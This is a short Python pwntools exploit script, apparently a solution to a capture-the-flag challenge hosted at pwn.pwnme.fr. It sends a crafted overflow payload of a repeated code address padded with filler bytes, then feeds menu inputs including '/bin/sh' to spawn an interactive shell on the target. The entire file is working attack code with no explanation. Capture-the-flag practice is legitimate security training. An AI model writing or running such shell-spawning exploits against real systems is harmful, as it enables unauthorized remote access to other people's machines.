
#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "pwn.pwnme.fr"
PORT = 7004

exe = ELF("./0x00b_patched")

context.log_level = 'info'



def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(["strace", "-o", "strace.out", "./0x00b_patched"])

    return r


def main():
    global r

    execute = 0x00000000004011ad
  
    payload = p64(execute) * 10
    payload += b"A" * (100 - len(payload) -1 )
    payload +=b'\n'
    
    r = conn()

    # rep = r.recv()
    # print(rep) 

    r.send(payload)

    # rep = r.recv()
    # print(rep)
 
    r.send(b'1\n')

    # rep = r.recv()
    # print(rep)

    r.send(b'/bin/sh\x00\n')
    # rep = r.recv()
    # print(rep)

    r.send(b'4\n')
    r.interactive()



if __name__ == "__main__":
    main()